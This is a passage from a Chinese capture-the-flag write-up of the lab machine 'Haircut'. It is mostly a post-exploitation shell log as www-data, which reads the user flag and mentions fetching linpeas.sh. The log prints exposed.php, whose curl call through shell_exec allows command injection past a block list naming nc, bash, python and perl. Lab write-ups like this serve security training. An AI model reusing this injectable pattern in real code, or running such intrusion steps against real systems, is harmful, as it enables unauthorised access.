class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@haircut:~/html$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 444<br>drwxr-xr-x 3 root     root       4096 May 19  2017 .<br>drwxr-xr-x 3 root     root       4096 May 16  2017 ..<br>-rwxr-xr-x 1 root     root     116637 May 15  2017 bounce.jpg<br>-rwxr-xr-x 1 root     root     167677 May 15  2017 carrie.jpg<br>-rwxr-xr-x 1 root     root        921 May 15  2017 exposed.php<br>-rwxr-xr-x 1 root     root        141 May 15  2017 hair.html<br>-rwxr-xr-x 1 root     root        144 May 15  2017 index.html<br>-rwxr-xr-x 1 root     root     135186 May 15  2017 sea.jpg<br>-rwxr-xr-x 1 root     root        223 May 15  2017 test.html<br>drwxr-xr-x 2 www-data www-data   4096 Jan  3 10:16 uploads<br>www-data@haircut:~/html$ <span class="hljs-built_in">cat</span> exposed.php<br><span class="hljs-built_in">cat</span> exposed.php<br>&lt;html&gt;<br>        &lt;<span class="hljs-built_in">head</span>&gt;<br>                &lt;title&gt;Hairdresser checker&lt;/title&gt;<br>        &lt;/head&gt;<br>        &lt;body&gt;<br>        &lt;form action=<span class="hljs-string">&#x27;exposed.php&#x27;</span> method=<span class="hljs-string">&#x27;POST&#x27;</span>&gt;<br>                &lt;span&gt;<br>                &lt;p&gt;<br>                Enter the Hairdresser<span class="hljs-string">&#x27;s location you would like to check. Example: http://localhost/test.html</span><br><span class="hljs-string">                &lt;/p&gt;</span><br><span class="hljs-string">                &lt;/span&gt;</span><br><span class="hljs-string">                &lt;input type=&#x27;</span>text<span class="hljs-string">&#x27; name=&#x27;</span>formurl<span class="hljs-string">&#x27; id=&#x27;</span>formurl<span class="hljs-string">&#x27; width=&#x27;</span>50<span class="hljs-string">&#x27; value=&#x27;</span>http://localhost/test.html<span class="hljs-string">&#x27;/&gt;</span><br><span class="hljs-string">                &lt;input type=&#x27;</span>submit<span class="hljs-string">&#x27; name=&#x27;</span>submit<span class="hljs-string">&#x27; value=&#x27;</span>Go<span class="hljs-string">&#x27; id=&#x27;</span>submit<span class="hljs-string">&#x27; /&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">        &lt;span&gt;</span><br><span class="hljs-string">                &lt;?php </span><br><span class="hljs-string">                        if(isset($_POST[&#x27;</span>formurl<span class="hljs-string">&#x27;]))&#123;</span><br><span class="hljs-string">                        echo &quot;&lt;p&gt;Requesting Site...&lt;/p&gt;&quot;; </span><br><span class="hljs-string">                        $userurl=$_POST[&#x27;</span>formurl<span class="hljs-string">&#x27;];</span><br><span class="hljs-string">                        $naughtyurl=0;</span><br><span class="hljs-string">                        $disallowed=array(&#x27;</span>%<span class="hljs-string">&#x27;,&#x27;</span>!<span class="hljs-string">&#x27;,&#x27;</span>|<span class="hljs-string">&#x27;,&#x27;</span>;<span class="hljs-string">&#x27;,&#x27;</span>python<span class="hljs-string">&#x27;,&#x27;</span>nc<span class="hljs-string">&#x27;,&#x27;</span>perl<span class="hljs-string">&#x27;,&#x27;</span>bash<span class="hljs-string">&#x27;,&#x27;</span>&amp;<span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-comment">#&#x27;,&#x27;&#123;&#x27;,&#x27;&#125;&#x27;,&#x27;[&#x27;,&#x27;]&#x27;);</span><br>                        foreach(<span class="hljs-variable">$disallowed</span> as <span class="hljs-variable">$naughty</span>)&#123;<br>                                <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$userurl</span>,<span class="hljs-variable">$naughty</span>) !==<span class="hljs-literal">false</span>)&#123;<br>                                        <span class="hljs-built_in">echo</span> <span class="hljs-variable">$naughty</span>.<span class="hljs-string">&#x27; is not a good thing to put in a URL&#x27;</span>;<br>                                        <span class="hljs-variable">$naughtyurl</span>=1;<br>                                &#125;<br>                        &#125;<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$naughtyurl</span>==0)&#123;<br>                                <span class="hljs-built_in">echo</span> shell_exec(<span class="hljs-string">&quot;curl &quot;</span>.<span class="hljs-variable">$userurl</span>.<span class="hljs-string">&quot; 2&gt;&amp;1&quot;</span>); <br>                        &#125;<br>                        &#125;<br>                ?&gt;<br>        &lt;/span&gt;<br>        &lt;/body&gt;<br>&lt;/html&gt;<br><br>www-data@haircut:~/html$ <br><br><br>www-data@haircut:~/html$ <br><br>www-data@haircut:~/html$ <span class="hljs-built_in">cd</span> /home/maria/<br><span class="hljs-built_in">cd</span> /home/maria/<br>www-data@haircut:/home/maria$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 104<br>drwxr-xr-x 15 maria maria 4096 Jul 13  2021 .<br>drwxr-xr-x  3 root  root  4096 Jul 13  2021 ..<br>-rw-------  1 maria maria  322 May 16  2017 .ICEauthority<br>-rw-------  1 maria maria   52 May 16  2017 .Xauthority<br>-rw-------  1 maria maria    1 Dec 24  2017 .bash_history<br>-rw-r--r--  1 maria maria  220 May 15  2017 .bash_logout<br>-rw-r--r--  1 maria maria 3771 May 15  2017 .bashrc<br>drwx------  9 maria maria 4096 Jul 13  2021 .cache<br>drwx------ 12 maria maria 4096 Jul 13  2021 .config<br>-rw-r--r--  1 maria maria   25 May 16  2017 .dmrc<br>drwxr-xr-x  3 maria maria 4096 Jul 13  2021 .<span class="hljs-built_in">local</span><br>-rw-------  1 maria maria  255 May 16  2017 .mysql_history<br>drwxrwxr-x  2 maria maria 4096 Jul 13  2021 .nano<br>-rw-r--r--  1 maria maria  655 May 15  2017 .profile<br>-rw-r--r--  1 maria maria    0 May 16  2017 .sudo_as_admin_successful<br>drwxrwxr-x  2 maria maria 4096 Jul 13  2021 .tasks<br>-rw-rw-r--  1 maria maria  203 May 19  2017 .wget-hsts<br>-rw-------  1 maria maria  957 May 16  2017 .xsession-errors<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Desktop<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Documents<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Downloads<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Music<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Pictures<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Public<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Templates<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Videos<br>-rw-r--r--  1 root  root    33 Jan  3 09:17 user.txt<br>www-data@haircut:/home/maria$ <span class="hljs-built_in">cat</span> .dmrc<br><span class="hljs-built_in">cat</span> .dmrc<br>[Desktop]<br>Session=ubuntu<br>www-data@haircut:/home/maria$ <span class="hljs-built_in">cd</span> .config<br><span class="hljs-built_in">cd</span> .config<br>bash: <span class="hljs-built_in">cd</span>: .config: Permission denied<br>www-data@haircut:/home/maria$ <span class="hljs-built_in">cd</span> .<span class="hljs-built_in">local</span><br><span class="hljs-built_in">cd</span> .<span class="hljs-built_in">local</span><br>www-data@haircut:/home/maria/.local$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 12<br>drwxr-xr-x  3 maria maria 4096 Jul 13  2021 .<br>drwxr-xr-x 15 maria maria 4096 Jul 13  2021 ..<br>drwxr-xr-x  6 maria maria 4096 Jul 13  2021 share<br>www-data@haircut:/home/maria/.local$ <span class="hljs-built_in">cd</span> share<br><span class="hljs-built_in">cd</span> share<br>www-data@haircut:/home/maria/.local/share$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 28<br>drwxr-xr-x 6 maria maria 4096 Jul 13  2021 .<br>drwxr-xr-x 3 maria maria 4096 Jul 13  2021 ..<br>-rw-rw-r-- 1 maria maria    0 May 16  2017 .converted-launchers<br>drwx------ 2 maria maria 4096 Jul 13  2021 applications<br>drwx------ 3 maria maria 4096 Jul 13  2021 nautilus<br>-rw-rw-r-- 1 maria maria  256 May 16  2017 session_migration-ubuntu<br>drwx------ 2 maria maria 4096 Jul 13  2021 sounds<br>drwxr-xr-x 2 maria maria 4096 Jul 13  2021 unity-settings-daemon<br>www-data@haircut:/home/maria/.local/share$ <span class="hljs-built_in">cat</span> session_migration-ubuntu<br><span class="hljs-built_in">cat</span> session_migration-ubuntu<br>[State]<br>timestamp=1494926439<br>migrated=03_unity_first_run_stamp_move;00_remove_obsolete_plugins_in_unity_session_v3.py;04_unity_update_software_center_desktop_file;01_unity_change_dconf_path;02_unity_setup_text_scale_factor;nautilus-unity-launcher-icon.py;<br>www-data@haircut:/home/maria/.local/share$ <span class="hljs-built_in">cd</span> unity-settings-daemon<br><span class="hljs-built_in">cd</span> unity-settings-daemon<br>www-data@haircut:/home/maria/.local/share/unity-settings-daemon$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 8<br>drwxr-xr-x 2 maria maria 4096 Jul 13  2021 .<br>drwxr-xr-x 6 maria maria 4096 Jul 13  2021 ..<br>-rw-rw-r-- 1 maria maria    0 May 16  2017 input-sources-converted<br>www-data@haircut:/home/maria/.local/share/unity-settings-daemon$ <span class="hljs-built_in">cat</span> input-sources-converted<br>&lt;a/.local/share/unity-settings-daemon$ <span class="hljs-built_in">cat</span> input-sources-converted           <br>www-data@haircut:/home/maria/.local/share/unity-settings-daemon$ <br><br>www-data@haircut:/home/maria/.local/share/unity-settings-daemon$ <span class="hljs-built_in">cd</span> ../../<br><span class="hljs-built_in">cd</span> ../../<br>www-data@haircut:/home/maria/.local$ <span class="hljs-built_in">cd</span> ../<br><span class="hljs-built_in">cd</span> ../<br>www-data@haircut:/home/maria$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 104<br>drwxr-xr-x 15 maria maria 4096 Jul 13  2021 .<br>drwxr-xr-x  3 root  root  4096 Jul 13  2021 ..<br>-rw-------  1 maria maria  322 May 16  2017 .ICEauthority<br>-rw-------  1 maria maria   52 May 16  2017 .Xauthority<br>-rw-------  1 maria maria    1 Dec 24  2017 .bash_history<br>-rw-r--r--  1 maria maria  220 May 15  2017 .bash_logout<br>-rw-r--r--  1 maria maria 3771 May 15  2017 .bashrc<br>drwx------  9 maria maria 4096 Jul 13  2021 .cache<br>drwx------ 12 maria maria 4096 Jul 13  2021 .config<br>-rw-r--r--  1 maria maria   25 May 16  2017 .dmrc<br>drwxr-xr-x  3 maria maria 4096 Jul 13  2021 .<span class="hljs-built_in">local</span><br>-rw-------  1 maria maria  255 May 16  2017 .mysql_history<br>drwxrwxr-x  2 maria maria 4096 Jul 13  2021 .nano<br>-rw-r--r--  1 maria maria  655 May 15  2017 .profile<br>-rw-r--r--  1 maria maria    0 May 16  2017 .sudo_as_admin_successful<br>drwxrwxr-x  2 maria maria 4096 Jul 13  2021 .tasks<br>-rw-rw-r--  1 maria maria  203 May 19  2017 .wget-hsts<br>-rw-------  1 maria maria  957 May 16  2017 .xsession-errors<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Desktop<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Documents<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Downloads<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Music<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Pictures<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Public<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Templates<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Videos<br>-rw-r--r--  1 root  root    33 Jan  3 09:17 user.txt<br>www-data@haircut:/home/maria$ <span class="hljs-built_in">cd</span> .nano    <br><span class="hljs-built_in">cd</span> .nano<br>www-data@haircut:/home/maria/.nano$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 8<br>drwxrwxr-x  2 maria maria 4096 Jul 13  2021 .<br>drwxr-xr-x 15 maria maria 4096 Jul 13  2021 ..<br>www-data@haircut:/home/maria/.nano$ <span class="hljs-built_in">cd</span> ../<br><span class="hljs-built_in">cd</span> ../<br>www-data@haircut:/home/maria$ <span class="hljs-built_in">cat</span> .profile<br><span class="hljs-built_in">cat</span> .profile<br><span class="hljs-comment"># ~/.profile: executed by the command interpreter for login shells.</span><br><span class="hljs-comment"># This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login</span><br><span class="hljs-comment"># exists.</span><br><span class="hljs-comment"># see /usr/share/doc/bash/examples/startup-files for examples.</span><br><span class="hljs-comment"># the files are located in the bash-doc package.</span><br><br><span class="hljs-comment"># the default umask is set in /etc/profile; for setting the umask</span><br><span class="hljs-comment"># for ssh logins, install and configure the libpam-umask package.</span><br><span class="hljs-comment">#umask 022</span><br><br><span class="hljs-comment"># if running bash</span><br><span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$BASH_VERSION</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-comment"># include .bashrc if it exists</span><br>    <span class="hljs-keyword">if</span> [ -f <span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/.bashrc&quot;</span> ]; <span class="hljs-keyword">then</span><br>        . <span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/.bashrc&quot;</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># set PATH so it includes user&#x27;s private bin directories</span><br>PATH=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/bin:<span class="hljs-variable">$HOME</span>/.local/bin:<span class="hljs-variable">$PATH</span>&quot;</span><br>www-data@haircut:/home/maria$ <span class="hljs-built_in">cat</span> .tasks<br><span class="hljs-built_in">cat</span> .tasks<br><span class="hljs-built_in">cat</span>: .tasks: Is a directory<br>www-data@haircut:/home/maria$ <span class="hljs-built_in">cat</span> .wget-hsts<br><span class="hljs-built_in">cat</span> .wget-hsts<br><span class="hljs-comment"># HSTS 1.0 Known Hosts database for GNU Wget.</span><br><span class="hljs-comment"># Edit at your own risk.</span><br><span class="hljs-comment"># &lt;hostname&gt;[:&lt;port&gt;]   &lt;incl. subdomains&gt;      &lt;created&gt;       &lt;max-age&gt;</span><br>ftp.gnu.org     0       0       1495170740      63072000<br>github.com      0       1       1495172243      31536000<br>www-data@haircut:/home/maria$ <span class="hljs-built_in">cd</span> Desktop<br><span class="hljs-built_in">cd</span> Desktop<br>www-data@haircut:/home/maria/Desktop$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 12<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 .<br>drwxr-xr-x 15 maria maria 4096 Jul 13  2021 ..<br>-r--r--r--  1 root  root    34 May 16  2017 user.txt<br>www-data@haircut:/home/maria/Desktop$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span> user.txt<br> 0b0da2af50e9ab7c81a6ec2c562afeae<br>www-data@haircut:/home/maria/Desktop$ <span class="hljs-built_in">cd</span> ../<br><span class="hljs-built_in">cd</span> ../<br>www-data@haircut:/home/maria$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 104<br>drwxr-xr-x 15 maria maria 4096 Jul 13  2021 .<br>drwxr-xr-x  3 root  root  4096 Jul 13  2021 ..<br>-rw-------  1 maria maria  322 May 16  2017 .ICEauthority<br>-rw-------  1 maria maria   52 May 16  2017 .Xauthority<br>-rw-------  1 maria maria    1 Dec 24  2017 .bash_history<br>-rw-r--r--  1 maria maria  220 May 15  2017 .bash_logout<br>-rw-r--r--  1 maria maria 3771 May 15  2017 .bashrc<br>drwx------  9 maria maria 4096 Jul 13  2021 .cache<br>drwx------ 12 maria maria 4096 Jul 13  2021 .config<br>-rw-r--r--  1 maria maria   25 May 16  2017 .dmrc<br>drwxr-xr-x  3 maria maria 4096 Jul 13  2021 .<span class="hljs-built_in">local</span><br>-rw-------  1 maria maria  255 May 16  2017 .mysql_history<br>drwxrwxr-x  2 maria maria 4096 Jul 13  2021 .nano<br>-rw-r--r--  1 maria maria  655 May 15  2017 .profile<br>-rw-r--r--  1 maria maria    0 May 16  2017 .sudo_as_admin_successful<br>drwxrwxr-x  2 maria maria 4096 Jul 13  2021 .tasks<br>-rw-rw-r--  1 maria maria  203 May 19  2017 .wget-hsts<br>-rw-------  1 maria maria  957 May 16  2017 .xsession-errors<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Desktop<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Documents<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Downloads<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Music<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Pictures<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Public<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Templates<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Videos<br>-rw-r--r--  1 root  root    33 Jan  3 09:17 user.txt<br>www-data@haircut:/home/maria$ <span class="hljs-built_in">cd</span> Documents<br><span class="hljs-built_in">cd</span> Documents<br>www-data@haircut:/home/maria/Documents$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 8<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 .<br>drwxr-xr-x 15 maria maria 4096 Jul 13  2021 ..<br>www-data@haircut:/home/maria/Documents$ <span class="hljs-built_in">cd</span> ../<br><span class="hljs-built_in">cd</span> ../<br>www-data@haircut:/home/maria$ <span class="hljs-built_in">cd</span> Downloads<br><span class="hljs-built_in">cd</span> Downloads<br>www-data@haircut:/home/maria/Downloads$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 8<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 .<br>drwxr-xr-x 15 maria maria 4096 Jul 13  2021 ..<br>www-data@haircut:/home/maria/Downloads$ <span class="hljs-built_in">cd</span> ../<br><span class="hljs-built_in">cd</span> ../<br>www-data@haircut:/home/maria$ <span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">cd</span> /tmp<br>www-data@haircut:/tmp$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 36<br>drwxrwxrwt  9 root     root     4096 Jan  3 10:18 .<br>drwxr-xr-x 23 root     root     4096 Jul 13  2021 ..<br>drwxrwxrwt  2 root     root     4096 Jan  3 09:17 .ICE-unix<br>drwxrwxrwt  2 root     root     4096 Jan  3 09:17 .Test-unix<br>drwxrwxrwt  2 root     root     4096 Jan  3 09:17 .X11-unix<br>drwxrwxrwt  2 root     root     4096 Jan  3 09:17 .XIM-unix<br>drwxrwxrwt  2 root     root     4096 Jan  3 09:17 .font-unix<br>prw-r--r--  1 www-data www-data    0 Jan  3 10:28 f<br>drwx------  3 root     root     4096 Jan  3 09:17 systemd-private-4addfdbf36d84214856db3b360e9d715-systemd-timesyncd.service-v98z48<br>drwx------  2 root     root     4096 Jan  3 09:17 vmware-root<br>www-data@haircut:/tmp$ <br></code></pre></td></tr></table></figure>

<p>15、然后开始下载，使用提权神器进行信息检索 linpeas.sh</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span 